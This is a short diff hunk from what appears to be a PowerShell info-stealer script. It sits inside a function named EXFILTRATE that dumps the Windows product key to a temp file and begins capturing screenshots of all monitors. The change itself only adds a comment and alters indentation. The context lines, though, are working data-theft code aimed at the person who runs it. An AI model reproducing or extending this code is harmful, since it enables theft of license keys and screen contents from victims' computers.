@@ -109,7 +109,8 @@ function EXFILTRATE {
     }
     Get-ProductKey > $env:localappdata\temp\ProductKey.txt
 	
-	Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    # Screenshot	
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
     $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
